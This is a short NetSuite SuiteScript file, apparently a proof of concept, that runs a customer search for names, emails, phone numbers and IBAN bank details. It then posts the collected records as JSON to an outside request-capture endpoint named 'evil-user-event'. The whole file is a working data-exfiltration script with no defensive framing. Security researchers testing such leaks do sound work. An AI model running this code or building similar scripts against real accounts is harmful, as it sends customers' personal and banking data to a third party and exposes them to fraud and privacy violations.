require(['N/record', 'N/email', 'N/search'], (record, email, search) => { 
    var customerSearchObj = search.create({
      type: "customer",
      filters: [
          ["entityid","haskeywords","test"], 
          "AND", 
          ["email","contains","no-reply"]
       ],
      columns: [
          search.createColumn({ name: "entityid", label: "Name" }),
          search.createColumn({ name: "email", label: "Email" }),
          search.createColumn({ name: "phone", label: "Phone" }),
          search.createColumn({
              name: "custrecord_2663_entity_iban",
              join: "CUSTRECORD_2663_PARENT_CUST_REF",
              label: "IBAN"
          }),
          // Sorting by creation date descending so latest records come first
          search.createColumn({ name: "datecreated", sort: search.Sort.DESC, label: "DateCreated" })
      ]
  });
  
  var results = customerSearchObj.run().getRange({ start: 0, end: 10 });
  var customersArray = [];
  
  results.forEach(function(result) {
      var customerObj = {};
      result.columns.forEach(function(col) {
          var key = col.label || col.name;
          customerObj[key] = result.getValue(col);
      });
      customersArray.push(customerObj);
  });
  
  var jsonResults = JSON.stringify(customersArray);
  log.debug("Customer JSON", jsonResults);

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://evil-user-event.free.beeceptor.com', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
      console.log('Response:', JSON.parse(xhr.responseText));
    } else {
      console.error('Error:', xhr.statusText);
    }
  };
  xhr.onerror = function() {
    console.error('Error:', xhr.statusText);
  };
  xhr.send(jsonResults);

  console.log('done')
});
